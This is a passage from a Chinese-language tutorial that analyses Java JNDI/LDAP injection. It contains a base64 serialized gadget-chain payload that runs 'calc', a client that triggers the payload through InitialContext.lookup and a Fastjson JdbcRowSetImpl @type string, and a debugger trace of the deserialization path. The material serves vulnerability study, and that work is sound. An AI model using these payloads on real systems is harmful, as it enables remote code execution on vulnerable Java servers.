aW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="));
            } catch (ParseException exception) {
                exception.printStackTrace();
            }

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```



```java
import com.alibaba.fastjson.JSON;

import javax.naming.Context;
import javax.naming.InitialContext;

public class JNDIGadgetClient {
    public static void main(String[] args) throws Exception {
        // lookup参数注入触发  
        Context context = new InitialContext();
        context.lookup("ldap://localhost:1234/ExportObject");

        // Fastjson反序列化JNDI注入Gadget触发
        String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"true\" }";
        JSON.parse(payload);
    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119836.png)



##### 分析：
在这里下断点调试

首先还是经过 lookup 的方法调用

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119597.png)

**InitialContext.lookup**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119493.png)

**ldapURLContext.lookup**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119211.png)

**ldapURLContext.lookup**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119982.png)

**GenericURLContext.lookup**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119690.png)

**GenericURLContext.lookup**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119370.png)

**PartialCompositeContext.lookup.p_lookup**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119175.png)

**ComponentContext.p_lookup.c_lookup**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119759.png)

**LdapCtx.c_lookup**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119325.png)



从上面是通过 p_lookup.c_lookup 进入到  **decodeObject** 中，这里是重点要关注的，

**decodeObject**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119733.png)

进入 **decodeObject**，先要进入一个 getURLClassLoader ，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119691.png)

getURLClassLoader 中的 trustURLCodebase 默认是 false ,不执行 newInstance 实例化，这里虽然已经获取到字节码了，只是不实例化就无法加载，也就无法命令执行。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119731.png)

接着往下走，来到了 deserializaObject ，

**decodeObject.deserializaObject**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242120786.png)

而 deserializaObject 对象中恰好有 readObject ，字节码在此处被反序列化造成漏洞。

**deserializaObject.readObject**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242120050.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242120465.png)



# 参考文章：
[https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-Jndi-%E7%BB%93%E5%90%88-ldap](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-Jndi-%E7%BB%93%E5%90%88-ldap)

http://101.36.122.13:4000/2025/03/08/JNDI%E4%B8%93%E9%A2%98/

https://www.bilibili.com/video/BV1ct4y1h79t



